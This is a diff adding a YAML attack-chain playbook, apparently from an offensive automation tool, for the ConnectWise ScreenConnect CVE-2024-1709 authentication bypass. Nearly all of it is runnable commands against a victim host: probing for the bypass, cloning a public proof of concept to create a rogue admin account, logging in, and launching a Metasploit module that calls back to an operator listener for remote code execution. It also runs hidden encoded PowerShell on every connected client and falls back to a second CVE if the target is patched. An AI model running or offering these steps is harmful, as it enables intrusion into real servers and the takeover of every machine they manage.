@@ -1,0 +1,69 @@
+chain_id: screenconnect_cve_2024_1709
+title: "ConnectWise ScreenConnect — CVE-2024-1709 SetupWizard auth bypass → admin RCE"
+severity: CRITICAL
+tags: [web, screenconnect, connectwise, cve-2024-1709, auth-bypass, ransomware]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2024-1709" }
+    - { banner_pattern: "(?i)screenconnect|connectwise" }
+    - { product_pattern: "(?i)screenconnect|connectwise" }
+    - { path_pattern: "(?i)/SetupWizard\\.aspx" }
+
+description: |
+  ConnectWise ScreenConnect 23.9.7 and earlier: navigating to
+  `/SetupWizard.aspx/` (note the trailing slash + segment) skips the
+  "is setup already complete" check, letting an unauth visitor create
+  a brand-new admin account. From admin you push a "ScreenConnect
+  Extension" .ashx that runs as the service user. Mass-exploited Feb
+  2024 by Black Basta and Bl00dy ransomware crews.
+
+steps:
+  - id: 1
+    title: "Confirm ScreenConnect is exposed"
+    command: |
+      curl -sk -i "https://$VICTIMA/" | grep -i 'screenconnect\\|connectwise'
+      curl -sk -I "https://$VICTIMA/SetupWizard.aspx"
+
+  - id: 2
+    title: "Trigger the bypass — 200 instead of 'setup complete' redirect"
+    command: |
+      curl -sk -i "https://$VICTIMA/SetupWizard.aspx/anything"
+
+  - id: 3
+    title: "Public PoC creates an admin account"
+    command: |
+      git clone https://github.com/watchtowrlabs/connectwise-screenconnect_auth-bypass-add-user-poc /tmp/sc
+      python3 /tmp/sc/exploit.py -t https://$VICTIMA -u rootctl -p 'Rootctl123!'
+
+  - id: 4
+    title: "Log in with the new admin"
+    command: |
+      curl -sk -c /tmp/sc.jar "https://$VICTIMA/Services/PageService.ashx/Login" \
+        -H 'Content-Type: application/json' \
+        -d '{"username":"rootctl","password":"Rootctl123!"}'
+
+  - id: 5
+    title: "Drop a malicious extension → RCE on the host"
+    command: |
+      msfconsole -qx 'use exploit/multi/http/connectwise_screenconnect_unauth_rce_cve_2024_1709; \
+        set RHOSTS $VICTIMA; set RPORT 443; set SSL true; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+  - id: 6
+    title: "Post — every connected client is now yours"
+    command: |
+      # Admin → Tools → Extensions → Run command on all sessions:
+      #   powershell -nop -w hidden -enc <b64-of-stage1>
+
+common_errors:
+  - error: "/SetupWizard.aspx/ returns 302"
+    solution: |
+      Patched (≥ 23.9.8). Confirm with `/Login.aspx` page footer (leaks
+      the build). If patched, target the in-memory build via the
+      Linux-specific CVE-2024-1708 path traversal.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2024-1709
+  - https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8
+  - https://labs.watchtowr.com/connectwise-screenconnect-auth-bypass-add-user/
